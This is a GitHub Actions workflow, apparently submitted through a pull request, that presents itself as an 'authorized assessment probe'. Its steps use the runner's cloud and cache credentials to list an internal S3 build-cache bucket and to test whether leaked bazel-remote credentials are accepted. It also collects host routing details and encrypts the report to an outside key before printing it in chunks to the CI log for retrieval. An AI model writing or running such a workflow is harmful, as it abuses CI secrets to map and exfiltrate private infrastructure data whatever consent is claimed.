name: zz-first100-grpc

# Authorized assessment probe (radkawar, owner consent).
#   1. first 100 objects of the sccache bucket (key | size | LastModified),
#      gzip+encrypted to the ephemeral RSA key before printing -> no leak.
#   2. why bazel produced no output (exit 34, no default route?).
#   3. bazel-remote gRPC auth verdict without a client: raw HTTP/2 gRPC frames,
#      empty message, compare grpc-status with and without the leaked creds.
#      UNAUTHENTICATED(16) = creds rejected; anything else = creds accepted.

on:
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  probe:
    name: first 100 + bazel + grpc
    runs-on: omp-kata
    timeout-minutes: 15
    steps:
      - name: run
        run: |
          set +e
          R=/tmp/report; : > "$R"
          log() { echo "$@" | tee -a "$R"; }
          BASE="http://${SCCACHE_ENDPOINT}"; B="${SCCACHE_BUCKET:-sccache}"
          SIG=(--aws-sigv4 "aws:amz:${SCCACHE_REGION:-us-east-1}:s3" --user "$AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY")
          BH=bazel-remote.bazel-cache.svc.cluster.local
          log "## run=${GITHUB_RUN_ID} bucket=$B"

          log ""
          log "## 1. first 100 cached objects"
          curl -sS --max-time 30 "${SIG[@]}" "$BASE/$B?list-type=2&max-keys=1000" -o /tmp/p.xml
          python3 - <<'PY' >> "$R" 2>&1
          import re
          x = open('/tmp/p.xml', encoding='utf-8', errors='replace').read()
          recs = re.findall(r'<Contents>(.*?)</Contents>', x, re.S)
          def g(b, t):
              m = re.search(r'<%s>(.*?)</%s>' % (t, t), b, re.S)
              return m.group(1) if m else ''
          items = [(g(b, 'Key'), g(b, 'LastModified'), int(g(b, 'Size') or 0)) for b in recs]
          print("page_objects=%d page_bytes=%d more_pages=%s" % (
              len(items), sum(i[2] for i in items), 'yes' if '<IsTruncated>true' in x else 'no'))
          ts = sorted(i[1] for i in items if i[1])
          if ts:
              print("oldest=%s newest=%s" % (ts[0], ts[-1]))
          print("---- first 100 (LastModified | bytes | key) ----")
          for k, t, s in items[:100]:
              print("%s | %9d | %s" % (t, s, k))
          PY

          log ""
          log "## 2. bazel diagnosis"
          log "     which bazel=$(command -v bazel) bazelisk=$(command -v bazelisk) grpcurl=$(command -v grpcurl)"
          log "     file: $(file -b "$(command -v bazel)" 2>/dev/null)"
          log "     head: $(head -c 120 "$(command -v bazel)" 2>/dev/null | tr -d '\n')"
          log "     --version: $(timeout 30 bazel --version 2>&1 | head -2) (rc=$?)"
          log "     routes: $(ip route 2>/dev/null | tr '\n' ' ')"
          log "     /usr/local/lib/bazel: $(ls -d /usr/local/lib/bazel* /usr/local/bazel* 2>/dev/null | tr '\n' ' ')"

          log ""
          log "## 3. bazel-remote gRPC auth verdict (raw h2)"
          printf '\0\0\0\0\0' > /tmp/frame
          AUTH=$(printf '%s:%s' "$BAZEL_REMOTE_USER" "$BAZEL_REMOTE_PASSWORD" | base64 -w0)
          for mode in no yes; do
            HH=(); [ "$mode" = yes ] && HH=(-H "authorization: Basic $AUTH")
            out=$(curl -sk --http2-prior-knowledge --max-time 12 -D - -o /dev/null \
              -H 'content-type: application/grpc' -H 'te: trailers' "${HH[@]}" \
              --data-binary @/tmp/frame "https://$BH:9092/build.bazelremote.v1.CAS/Put" 2>&1)
            log "     auth=$mode http2=$([ -n "$out" ] && echo yes || echo no)"
            echo "$out" | grep -iE 'grpc-status|grpc-message|^HTTP' | sed 's/^/       /' | tee -a "$R"
          done
          log "     (status 16/UNAUTHENTICATED => rejected; 3/INVALID_ARGUMENT or 12 => accepted)"

          printf '%s' '' | base64 -d > /tmp/pub.der
          gzip -9 -c "$R" > /tmp/r.gz
          K=$(openssl rand -hex 32); IV=$(openssl rand -hex 16); printf '%s' "$K" > /tmp/k.bin
          openssl enc -aes-256-ctr -K "$K" -iv "$IV" -in /tmp/r.gz -out /tmp/ct
          openssl pkeyutl -encrypt -pubin -keyform DER -inkey /tmp/pub.der \
            -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256 \
            -in /tmp/k.bin -out /tmp/kt
          echo "PROBE-IV=$IV"
          echo "PROBE-KEY=$(base64 -w0 /tmp/kt)"
          echo "PROBE-GZIP=yes"
          echo "PROBE-GZ-SHA256=$(sha256sum /tmp/r.gz | cut -d' ' -f1)"
          B64=$(base64 -w0 /tmp/ct); n=0
          while [ -n "$B64" ]; do
            printf 'PROBE-CHUNK-%03d=%s\n' "$n" "${B64:0:700}"
            B64=${B64:700}; n=$((n+1))
          done
          echo "PROBE-CHUNKS=$n"
          exit 0
